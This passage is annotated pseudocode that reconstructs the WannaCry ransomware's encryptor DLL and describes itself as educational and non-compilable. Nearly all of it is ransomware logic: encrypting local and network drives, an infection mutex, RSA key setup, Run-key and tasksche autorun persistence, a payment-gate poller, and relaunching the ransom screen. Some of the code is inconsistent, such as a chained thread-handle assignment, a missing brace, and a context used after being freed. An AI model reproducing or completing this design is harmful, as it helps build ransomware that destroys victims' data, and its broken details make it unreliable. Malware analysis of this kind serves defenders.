        for (int net = 0; net < 2; net++)
            for (int d = 25; d > 1; d--) {                  // letters 25..2 = Z: down to C:
                if (!(drives>>d & 1)) continue;
                UINT t = GetDriveTypeW(driveRoot(d));
                if (net == 0 && t == DRIVE_REMOTE) continue;
                if (net == 1 && t != DRIVE_REMOTE) continue;
                EncryptDrive(c, d, 1);
            }
        InterlockedExchange(&g_lastDriveSerial, -1);
        EnumUserDirs(0x19 /* profile-folder id */);
        bool firstCheck = (g_lastCheck == 0);
        if (firstCheck) { sprintf(cmdline, "%s co", "@WanaDecryptor@.exe"); RunProcess(cmdline, 0, NULL); }  // decryptor UI connection check
        time(&g_lastCheck); SaveAppState();
        if (pass + 1 == 1)
            sprintf(cmdline, "cmd.exe /c start /b %s vs", "@WanaDecryptor@.exe");   // pop the decryptor UI detached
            RunProcess(cmdline, 0, NULL);
        if (firstCheck) {
            FillDiskFreeSpace(2);
            for (int d = 25; d > 2; d--)
                if (drives>>d & 1 && GetDriveTypeW(driveRoot(d)) == DRIVE_FIXED)
                    FillDiskFreeSpace(d);
        }
        Sleep(60000);
        pass++;
    }
}

// ---------------------------------------------------------------------------
// ENTRY — exported TaskStart: picks install mode vs persistence-only mode.
// ---------------------------------------------------------------------------
extern "C" __declspec(dllexport)
int TaskStart(HMODULE hinst, int reason)
{
    if (reason != 0) {
        // relaunch entry: just run the persistence / decryptor-relaunch
        // thread (30 s loop — see appendix) and wait on it forever
        HANDLE t = CreateThread(NULL, 0, PersistTaskscheThread,
                                NULL, 0, NULL);
        WaitForSingleObject(t, INFINITE); CloseHandle(t);
        return 0;
    }

    if (CheckGlobalMutant())                      // infection mutex already held?
        goto persist_wait;                        // then DON'T encrypt again — only keep
                                                  // persistence + UI relaunch alive
    WCHAR mod[0x104]; GetModuleFileNameW(hinst, mod, 0x103);
    *wcsrchr(mod, L'\\') = 0; SetCurrentDirectoryW(mod);   // work from the payload's own directory

    if (!ReadConfig(1)) goto out;                 // load the c.wnry config
    g_isSystem = IsSystemUser();
    if (!InitFileApi()) goto out;                 // resolve the file-API pointers
    if (!InitCryptoApi()) goto out;               // resolve the crypto-API pointers

    sprintf(g_resName, "%08X.res", 0);
    sprintf(g_pkyName, "%08X.pky", 0);
    sprintf(g_ekyName, "%08X.eky", 0);

    if (CheckOrCreateGlobalMutant(0) || TryRestoreDecryptionKey(0))
        goto persist_wait;                        // either condition diverts to
                                                  // persistence-only mode
    RsaCtx *rsa = new RsaCtx; CritSectObjInit(rsa);
    if (!RsaCtxInit(rsa, g_pkyName, g_ekyName)) goto out;   // build/restore the RSA key set

    if (!LoadAppState() || g_state[0x08] != 0) {  // missing/corrupt saved state:
        DeleteFileA(g_resName);                   // start a fresh 8-byte install id
        memset(g_state, 0, 0x88);
        GenRandom(g_state, 8);
    }
    RsaCtxFree(rsa);
    CritSectUnlock(rsa);

    // install path: five worker threads
    HANDLE t;
    t = CreateThread(NULL, 0, PersistRunKeyThread,   NULL, 0, NULL); CloseHandle(t);  // Run-key persistence
    Sleep(100);
    t = CreateThread(NULL, 0, WaitDecryptionKeyThread, NULL, 0, NULL); CloseHandle(t);// payment-gate poller
    Sleep(100);
    HANDLE hWatch =
    t = CreateThread(NULL, 0, WatchNewDrivesThread,  NULL, 0, NULL);                  // new-drive watcher
    Sleep(100);
    t = CreateThread(NULL, 0, DelayEncryptUserFolders, NULL, 0, NULL); CloseHandle(t);// delayed user-folder pass
    Sleep(100);
    t = CreateThread(NULL, 0, PersistTaskscheThread, NULL, 0, NULL); CloseHandle(t);  // tasksche persistence + UI relaunch
    Sleep(100);
    MainEncryptLoop(rsa);                                                // the encryption campaign itself
    WaitForSingleObject(hWatch, INFINITE);            // stay alive with the drive watcher
    goto out;

persist_wait:
    t = CreateThread(NULL, 0, PersistTaskscheThread, NULL, 0, NULL);
    WaitForSingleObject(t, INFINITE); CloseHandle(t);
out:
    return 0;
}

// DllMain saves the module handle — used to locate the payload's directory.
// ============================================================================
// Educational reconstruction: annotated pseudocode with deliberate elisions;
// not compilable as-is. This DLL only ever encrypts — decryption of victims'
// files lives in the separate payment-UI program.
// ============================================================================

// ============================================================================
// APPENDIX — the persistence / UI-relaunch thread (started from TaskStart on
// both the main and the persistence-only path; early notes misleadingly
// called it "PaymentCheckThread").
//
// It never touches key files or crypto (this DLL has no decrypt path at
// all). The loop, every 30 seconds:
//   - read the clock; if the persisted timestamps are not sane yet, just sleep
//   - first run: stamp the current time into the c.wnry config so later
//     runs know they are not the first
//   - relaunch the decryptor UI so the ransom screen stays in front of the
//     victim on every cycle
//   - first run: resolve the full path of tasksche.exe and register it as
//     an autorun via "cmd.exe /c reg add ...Run..." (random value name,
//     10 s timeout)
//
// The REAL payment gate is the separate 5-second poller
// (WaitDecryptionKeyThread) that keeps testing the .pky/.dky pair until it
// validates.
// ============================================================================
